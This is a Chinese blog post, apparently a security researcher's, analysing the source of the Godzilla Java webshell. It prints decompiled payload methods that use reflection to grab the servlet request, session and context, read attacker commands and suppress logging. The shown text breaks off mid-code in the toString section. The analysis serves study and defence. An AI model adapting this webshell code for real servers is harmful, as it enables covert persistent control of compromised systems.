@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="现在是7月24号，回想起之前关于哥斯拉源码分析的文章其实还有颇多不足之处，做一点补充。之前已经提过了发送的指令数据如何封装发送。现在看看shell是怎么对指令做处理并且去执行的对应方法的。 在我们第一次注入进大马后，后续的指令发送，如果密码密钥之类的没问题，会走到下面逻辑 123456789request.setAttribute(&quot;parameters&quot;, data);  j">
+<meta property="og:type" content="article">
+<meta property="og:title" content="哥斯拉源码分析(二)">
+<meta property="og:url" content="http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/index.html">
+<meta property="og:site_name" content="cmisl_破站">
+<meta property="og:description" content="现在是7月24号，回想起之前关于哥斯拉源码分析的文章其实还有颇多不足之处，做一点补充。之前已经提过了发送的指令数据如何封装发送。现在看看shell是怎么对指令做处理并且去执行的对应方法的。 在我们第一次注入进大马后，后续的指令发送，如果密码密钥之类的没问题，会走到下面逻辑 123456789request.setAttribute(&quot;parameters&quot;, data);  j">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250724175225271.png">
+<meta property="article:published_time" content="2025-07-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-25T06:30:37.033Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250724175225271.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>哥斯拉源码分析(二)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/08/18/PostgreSQL%20JDBC%20RCE%20&&%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/07/14/OpenRasp%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&text=哥斯拉源码分析(二)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&title=哥斯拉源码分析(二)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&is_video=false&description=哥斯拉源码分析(二)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=哥斯拉源码分析(二)&body=Check out this article: http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&title=哥斯拉源码分析(二)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&title=哥斯拉源码分析(二)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&title=哥斯拉源码分析(二)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&title=哥斯拉源码分析(二)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&name=哥斯拉源码分析(二)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/07/24/%E5%93%A5%E6%96%AF%E6%8B%89%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90(2)/&t=哥斯拉源码分析(二)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#equals"><span class="toc-number">1.</span> <span class="toc-text">equals</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#handle"><span class="toc-number">1.1.</span> <span class="toc-text">handle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#toString-NaN"><span class="toc-number">2.</span> <span class="toc-text">toString</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#initSessionMap"><span class="toc-number">2.1.</span> <span class="toc-text">initSessionMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#formatparameter"><span class="toc-number">2.2.</span> <span class="toc-text">formatparameter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#run"><span class="toc-number">2.3.</span> <span class="toc-text">run</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        哥斯拉源码分析(二)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">cmisl</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-07-23T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-07-24</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>现在是7月24号，回想起之前关于哥斯拉源码分析的文章其实还有颇多不足之处，做一点补充。之前已经提过了发送的指令数据如何封装发送。现在看看shell是怎么对指令做处理并且去执行的对应方法的。</p>
+<p>在我们第一次注入进大马后，后续的指令发送，如果密码密钥之类的没问题，会走到下面逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">request.setAttribute(<span class="string">&quot;parameters&quot;</span>, data);  </span><br><span class="line">java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();  </span><br><span class="line"><span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> ((Class) session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();  </span><br><span class="line">f.equals(arrOut);  </span><br><span class="line">f.equals(pageContext);  </span><br><span class="line">response.getWriter().write(md5.substring(<span class="number">0</span>, <span class="number">16</span>));  </span><br><span class="line">f.toString();  </span><br><span class="line">response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));  </span><br><span class="line">response.getWriter().write(md5.substring(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>
+
+<p>f是注入的大马的实例，可以看到后续会调用其equals和toString方法。这里可不是判断相等和字符串输出的方法，而是自实现暗藏玄机的一段代码。在执行webshell管理器发送的指令起到了很关键的作用。</p>
+<h2 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h2><p>没啥好说的，把收到的对象丢到handle函数处理。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.handle(obj)) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.noLog(<span class="built_in">this</span>.servletContext);  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="handle"><a href="#handle" class="headerlink" title="handle"></a>handle</h3><p>因此重心可以放在handle方法，这个方法用于处理和分发传入的不同对象类型。class$1没有显示初始化，因此可以用默认值看待，对于Class默认值应该是null。</p>
+<p>这个是判断传入的对象是否是ByteArrayOutputStream类型，如果是的话，就将传入的对象赋值给该大马的outputStream成员变量。不是的话进入另外的分支。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">handle</span><span class="params">(Object obj)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">var10000</span> <span class="operator">=</span> class$<span class="number">1</span>;  </span><br><span class="line">        <span class="keyword">if</span> (var10000 == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                var10000 = Class.forName(<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span>);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var7) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var7).getMessage());  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            class$<span class="number">1</span> = var10000;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (var10000.isAssignableFrom(obj.getClass())) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.outputStream = (ByteArrayOutputStream)obj;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>走到上述代码的else分支语句中，涉及到了另一个方法，supportClass。这部分主要是检测传入的obj是否属于下面四个类，jakarta是为了tomcat10+版本做适配：</p>
+<ul>
+<li>javax.servlet.http.HttpServletRequest</li>
+<li>jakarta.servlet.http.HttpServletRequest</li>
+<li>javax.servlet.ServletRequest</li>
+<li>jakarta.servlet.ServletRequest</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">handle</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">	......</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">this</span>.supportClass(obj, <span class="string">&quot;%s.servlet.http.HttpServletRequest&quot;</span>))&#123; </span><br><span class="line">		    <span class="built_in">this</span>.servletRequest = obj;  </span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.supportClass(obj, <span class="string">&quot;%s.servlet.ServletRequest&quot;</span>)) &#123;  </span><br><span class="line">		    <span class="built_in">this</span>.servletRequest = obj;  </span><br><span class="line">		&#125;</span><br><span class="line">		......</span><br><span class="line">	&#125;</span><br><span class="line">	......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">supportClass</span><span class="params">(Object obj, String classNameString)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">false</span>;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">if</span> ((c = getClass(String.format(classNameString, <span class="string">&quot;javax&quot;</span>))) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                ret = c.isAssignableFrom(obj.getClass());  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> (!ret &amp;&amp; (c = getClass(String.format(classNameString, <span class="string">&quot;jakarta&quot;</span>))) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                ret = c.isAssignableFrom(obj.getClass());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> ret;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果上面四个类都没命中，就进入else语句，这里和刚刚一样class$0默认值为null，因此开始会将其和var10000赋值为字节数组的Class对象。所以后续匹配就是匹配obj是否为byte[]。如果是的话，就将obj赋值给当前大马的requestData成员变量。不是的话还会再次调用supportClass方法，去匹配java.servlet.http.HttpSession和jakarta.servlet.http.HttpSession这两个类。命中的话赋值给当前大马的httpSession成员变量。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;  </span><br><span class="line">    var10000 = class$<span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (var10000 == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            var10000 = Class.forName(<span class="string">&quot;[B&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var6) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var6).getMessage());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        class$<span class="number">0</span> = var10000;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (var10000.isAssignableFrom(obj.getClass())) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.requestData = (<span class="type">byte</span>[])obj;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.supportClass(obj, <span class="string">&quot;%s.servlet.http.HttpSession&quot;</span>)) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.httpSession = obj;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">this</span>.handlePayloadContext(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里匹配完会会调用handlePayloadContext方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handlePayloadContext</span><span class="params">(Object obj)</span> &#123;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRequestMethod</span> <span class="operator">=</span> <span class="built_in">this</span>.getMethodByClass(obj.getClass(), <span class="string">&quot;getRequest&quot;</span>, (Class[])<span class="literal">null</span>);  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">getServletContextMethod</span> <span class="operator">=</span> <span class="built_in">this</span>.getMethodByClass(obj.getClass(), <span class="string">&quot;getServletContext&quot;</span>, (Class[])<span class="literal">null</span>);  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">getSessionMethod</span> <span class="operator">=</span> <span class="built_in">this</span>.getMethodByClass(obj.getClass(), <span class="string">&quot;getSession&quot;</span>, (Class[])<span class="literal">null</span>);  </span><br><span class="line">        <span class="keyword">if</span> (getRequestMethod != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.servletRequest == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.servletRequest = getRequestMethod.invoke(obj, (Object[])<span class="literal">null</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (getServletContextMethod != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.servletContext == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.servletContext = getServletContextMethod.invoke(obj, (Object[])<span class="literal">null</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (getSessionMethod != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.httpSession == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.httpSession = getSessionMethod.invoke(obj, (Object[])<span class="literal">null</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var5) &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个方法是进一步获取其他环境信息，获取反射获取传入obj的getRequest、getServletContext、getSession属性，如果存在的话并且当前成员变量对应的值是null，那就赋值给成员变量。</p>
+<p>比如在tomcat8就有如下调用，如果obj传入的是pageContext，就可以获取当前环境的HttpSession、ServletRequest和ServletContext，其他的也类似。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request.getSession();  </span><br><span class="line">request.getServletContext();  </span><br><span class="line">  </span><br><span class="line">session.getServletContext();  </span><br><span class="line">  </span><br><span class="line">pageContext.getRequest();  </span><br><span class="line">pageContext.getSession();  </span><br><span class="line">pageContext.getServletContext();</span><br></pre></td></tr></table></figure>
+
+<p>接着下面代码看起来很长，实际就是如果有成员变量servletRequest，并且requestData为null。就去通过反射调用servletRequest.getAttribute(“parameters”)方法，如果返回的结果是字节数组，就将其赋值给requestData。</p>
+<p>实际上就就是为了获取传入的data，因为还记得最开始提到shell的第一段代码是什么吗，正是request.setAttribute(“parameters”, data);。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.servletRequest != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.requestData == <span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">var10001</span> <span class="operator">=</span> <span class="built_in">this</span>.servletRequest;  </span><br><span class="line">    Class[] var10003 = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];  </span><br><span class="line">    <span class="type">Class</span> <span class="variable">var10006</span> <span class="operator">=</span> class$<span class="number">2</span>;  </span><br><span class="line">    <span class="keyword">if</span> (var10006 == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            var10006 = Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var5).getMessage());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        class$<span class="number">2</span> = var10006;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    var10003[<span class="number">0</span>] = var10006;  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">retVObject</span> <span class="operator">=</span> <span class="built_in">this</span>.getMethodAndInvoke(var10001, <span class="string">&quot;getAttribute&quot;</span>, var10003, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;parameters&quot;</span>&#125;);  </span><br><span class="line">    <span class="keyword">if</span> (retVObject != <span class="literal">null</span>) &#123;  </span><br><span class="line">        var10000 = class$<span class="number">0</span>;  </span><br><span class="line">        <span class="keyword">if</span> (var10000 == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                var10000 = Class.forName(<span class="string">&quot;[B&quot;</span>);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var4) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(((Throwable)var4).getMessage());  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            class$<span class="number">0</span> = var10000;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (var10000.isAssignableFrom(retVObject.getClass())) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.requestData = (<span class="type">byte</span>[])retVObject;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样下来思路就很清晰了，直接通过两个equals将大马payload中五个变量就赋值了，outputStream就是arrOut，servletContext、servletRequest、httpSession可以通过pageContext反射调用方法获取，然后requestData也是通过反射获取servletRequest中小马中加进去的data。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250724175225271.png"></p>
+<h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h2><p>接着就是toString方法了。先看最前面，首先是判断outputStream是否为null，这个我们用equal设置了为arrOut，自然不是null，因此可以走进语句，这里在用GZIPOutputStream封装outputStream前后会调用initSessionMap和formatParameter方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">returnString</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.outputStream != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.initSessionMap();  </span><br><span class="line">            <span class="type">GZIPOutputStream</span> <span 